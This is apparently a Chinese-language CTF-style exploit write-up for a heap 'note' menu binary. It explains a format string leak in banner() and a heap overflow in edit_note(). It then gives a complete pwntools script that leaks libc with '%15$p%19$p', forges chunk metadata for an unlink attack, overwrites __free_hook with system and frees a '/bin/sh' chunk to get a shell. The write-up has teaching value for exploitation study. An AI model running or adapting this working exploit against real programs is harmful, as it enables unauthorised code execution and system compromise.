# 漏洞利用文档

## 执行环境
基于调试记录和分析，程序的运行环境如下：
- **文件类型**: ELF 64-bit LSB executable, x86-64
- **安全机制**:
  - PIE: Enabled (地址空间随机化)
  - Stack Canary: Enabled (栈保护)
  - NX: Enabled (数据段不可执行)
  - Full RELRO: Enabled (GOT表只读)
- **依赖库**: 依赖libc (通过ldd确认)
- **运行需求**: Linux环境，需要libc库支持，程序接受用户输入并通过菜单交互

## 漏洞成因
### 关键结构体
```c
struct note_entry {
    void *content_ptr;    // 指向堆分配的笔记内容
    unsigned int size;    // 笔记大小
} note[11];              // 全局笔记数组，索引0-10

unsigned int counts;     // 当前笔记计数
int key;                 // 全局密钥变量
```

### 主要漏洞分析
1. **格式化字符串漏洞**
   - **位置**: `banner()`函数中的`printf(format)`
   - **成因**: 用户输入直接作为格式字符串参数，未经过滤
   - **影响**: 允许泄露栈内存地址和libc地址，为后续利用提供信息基础

2. **堆溢出漏洞** 
   - **位置**: `edit_note()`函数中的内容写入操作
   - **成因**: 通过编辑笔记内容，可以溢出到相邻堆块的元数据区域
   - **利用**: 伪造堆块fd/bk指针，触发unlink攻击修改全局变量

3. **逻辑缺陷**
   - **位置**: `add_note()`中的大小检查逻辑
   - **问题**: 当key≠43且size≤0x80时直接返回，可能留下不一致状态

## 漏洞利用过程
### 利用步骤与内存变化表

| 步骤 | 操作 | 堆内存变化 | 全局变量变化 | 关键地址状态 |
|------|------|------------|-------------|-------------|
| 1 | 格式化字符串泄露 | 无变化 | 无变化 | 泄露libc基址(0x79290dd05000)和程序基址 |
| 2 | 计算关键地址 | 无变化 | 无变化 | 计算free_hook(0x79290e0cb7a8)和system(0x79290dd4a3a0) |
| 3 | add(0,0x98) add(1,0x90) | 分配两个相邻chunk: chunk0(0xa1), chunk1(0xa1) | counts=2, note[0/1]指向堆地址 | 堆布局完成，为溢出准备 |
| 4 | edit(0)堆溢出 | chunk0数据区写入伪造元数据，覆盖chunk1的prev_size | 无直接变化 | 设置fd→key+8, bk→key+10，准备unlink |
| 5 | delete(1)触发unlink | chunk1被释放，unlink修改指针 | note[0].content_ptr被修改为key+8 | 实现任意地址写能力 |
| 6 | edit(0)设置指针 | 无堆变化 | note[0]指向free_hook, note[1]指向"/bin/sh" | 建立利用链：free_hook作为目标 |
| 7 | edit(0)覆盖hook | 无堆变化 | __free_hook被覆盖为system地址 | 关键钩子被劫持 |
| 8 | delete(1)触发 | chunk1再次释放，触发system("/bin/sh") | counts=1 | 获得shell执行权限 |
| 9 | interactive() | 进程切换到/bin/dash | 完全控制程序流 | 利用成功完成 |

### 内存变化关键点
- **堆布局**: 初始→两个相邻chunk→伪造元数据→触发unlink→清理状态
- **全局变量**: note数组指针被逐步修改，最终指向free_hook和system
- **安全绕过**: 通过精心构造的堆操作绕过PIE、Canary等保护机制

## Exploit
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample12')
elf = ELF('./data/sample12')
libc = elf.libc

def add(idx, size, content):
    p.sendlineafter(b'>> ', b'1')
    p.recvuntil(b'(0-10):')
    p.sendline(str(idx))
    p.recvuntil(b'Enter a size:\n')
    p.sendline(str(size))
    p.recvuntil(b'Enter the content: \n')
    p.sendline(content)

def edit(idx, content):
    p.sendlineafter(b'>> ', b'4')
    p.recvuntil(b'Enter an index:\n')
    p.sendline(str(idx))
    p.recvuntil(b'Enter the content: \n')
    p.sendline(content)

def delete(idx):
    p.sendlineafter(b'>> ', b'2')
    p.recvuntil(b'Enter an index:\n')
    p.sendline(str(idx).encode())

# Step 1: 利用格式化字符串漏洞泄露关键地址
p.recvuntil(b'Enter your name: ')
p.sendline(b'%15$p%19$p')  # 泄露栈中第15和19个参数的值
p.recvuntil(b'Hello, ')
leak = int(p.recv(14), 16) - 240  # 计算__libc_start_main地址
base = leak - libc.symbols["__libc_start_main"]  # 计算libc基址
libc.address = base
sys = libc.symbols["system"]  # 获取system函数地址
free_hook = libc.symbols["__free_hook"]  # 获取free_hook地址

# Step 2: 计算全局变量地址
leak1 = int(p.recv(15), 16)
ptr = leak1 - 0x116a + 0x202060  # 计算note数组地址

# Step 3: 布置堆内存，分配两个相邻chunk
add(0, 0x98, 'a'*8)  # 分配chunk0，大小0x98
add(1, 0x90, 'b'*8)  # 分配chunk1，大小0x90，与chunk0相邻

# Step 4: 堆溢出攻击，伪造chunk元数据
payload = p64(0) + p64(0x91) + p64(ptr - 0x18) + p64(ptr - 0x10) + p64(0)*14 + p64(0x90) + b"\xa0"
edit(0, payload)  # 通过编辑chunk0溢出到chunk1头部，设置伪造的fd/bk指针

# Step 5: 触发unlink攻击，修改全局指针
delete(1)  # 释放chunk1，触发unlink操作，修改note[0].content_ptr

# Step 6: 利用修改的指针设置攻击链
payload = p64(0)*3 + p64(free_hook) + p64(0x48) + p64(ptr + 0x18) + b'/bin/sh\x00'
edit(0, payload)  # 将note[0]指向free_hook，note[1]指向"/bin/sh"

# Step 7: 覆盖free_hook为system
payload = p64(sys)
edit(0, payload)  # 通过note[0]写入system地址到free_hook

# Step 8: 触发system执行
delete(1)  # 释放包含"/bin/sh"的chunk，触发system("/bin/sh")

# Step 9: 获得shell控制权
p.interactive()
```

### 漏洞利用关键注释
- **格式化字符串利用**: 通过`%15$p%19$p`泄露栈地址，计算libc和程序基址
- **堆布局**: 精心分配相邻chunk，为溢出和unlink攻击创造条件  
- **unlink攻击**: 利用堆溢出伪造fd/bk指针，在free时修改全局变量
- **钩子劫持**: 通过修改的全局指针覆盖`__free_hook`，将free调用重定向到system
- **触发执行**: 释放包含"/bin/sh"的chunk，触发system执行获得shell

此漏洞利用成功结合了格式化字符串漏洞的信息泄露能力和堆溢出的内存破坏能力，实现了完整的代码执行链。
